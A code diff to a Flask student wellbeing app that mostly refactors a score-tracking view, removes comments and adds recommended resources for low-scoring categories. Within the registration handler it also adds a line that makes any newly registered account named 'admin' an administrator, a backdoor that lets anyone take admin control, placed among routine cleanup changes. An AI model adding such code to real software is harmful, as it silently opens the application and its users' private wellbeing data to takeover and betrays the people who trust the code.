@@ -31,7 +31,8 @@ def registration():
             year_of_study=form.year_of_study.data
         )
         user.set_password(form.password.data)
-
+        if form.username.data.lower() == "admin":
+            user.is_admin = True
         try:
             db.session.add(user)
             db.session.commit()
@@ -49,10 +50,8 @@ def complete():
     from datetime import datetime, timezone
     import sqlalchemy as sa
 
-    # Get today's date
     today = datetime.now(timezone.utc).date()
 
-    # Get todays notification for this user
     notification = Notification.query.filter(
         Notification.student_id == current_user.id,
         Notification.type == "daily",
@@ -62,7 +61,6 @@ def complete():
     if not notification:
         return redirect(url_for("index"))
 
-    # Prevent duplicate submission (based on notification)
     existing = WellbeingResponse.query.filter_by(
         notification_id=notification.notification_id
     ).first()
@@ -165,15 +163,20 @@ def logout():
 @app.route("/tracking", methods=['GET','POST'])
 @login_required
 def tracking():
+
     if current_user.is_admin:
         return redirect(url_for('index'))
+
     graph = request.args.get("graph_options", "stress")
-    print(graph)
-    user = current_user.responses
+
+    user_responses = current_user.responses
+
     data = []
     title = None
-    for response in user:
+
+    for response in user_responses:
         date = response.date.strftime("%d-%m-%Y")
+
         if graph == "stress":
             data.append((date, response.stress))
             title = "Stress Score over Time"
@@ -192,15 +195,49 @@ def tracking():
         else:
             title = "Sleep Score over Time"
             data.append((date, response.sleep))
+
     labels = [row[0] for row in data]
     values = [row[1] for row in data]
-    avg = 0
-    for val in values:
-        avg += val
-    avg = avg/len(values)
 
+    avg = sum(values) / len(values) if values else 0
 
-    return render_template("tracking.html", labels=labels, values=values, title=title, avg=avg, graph_option=graph )
+    LOW_THRESHOLD = 2
+
+    totals = {
+        "stress": 0,
+        "sleep": 0,
+        "social": 0,
+        "academic": 0,
+        "activity": 0
+              }
+
+    count = len(user_responses)
+
+    for r in user_responses:
+        totals["stress"] += r.stress
+        totals["sleep"] += r.sleep
+        totals["social"] += r.social
+        totals["academic"] += r.academic
+        totals["activity"] += r.activity
+
+    averages = {
+        k: (totals[k] / count) if count > 0 else 0
+        for k in totals
+    }
+
+    low_categories = [
+        k for k, v in averages.items()
+        if v <= LOW_THRESHOLD
+    ]
+
+    if low_categories:
+        resources = Resource.query.filter(
+            Resource.category.in_(low_categories)
+        ).all()
+    else:
+        resources = []
+
+    return render_template("tracking.html", labels=labels, values=values, title=title, avg=avg, graph_option=graph, resources = resources, low_categories=low_categories )
 
 @app.route("/admin/resources", methods=['GET', 'POST'])
 @login_required
@@ -257,8 +294,5 @@ def delete_resource(resource_id):
     return redirect(url_for('add_resources'))
 
 from app.models import User
-
-
-
 
 
